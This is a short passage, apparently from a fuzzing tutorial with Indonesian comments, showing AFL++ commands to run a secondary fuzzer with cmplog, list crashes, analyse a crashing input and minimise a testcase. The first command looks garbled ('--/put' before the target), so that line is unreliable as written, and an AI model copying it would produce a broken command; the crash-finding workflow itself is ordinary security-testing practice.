afl-fuzz -i seeds -o out -S s3 -c ./target.cmplog --/put ./target @@

# Cek hasil
ls out/main/crashes/
afl-analyze -i out/main/crashes/id:000000 -- ./target    # lokasi bytes yang signifikan

# Minimize testcase
afl-tmin -i crash_file -o crash_min -- ./target
```
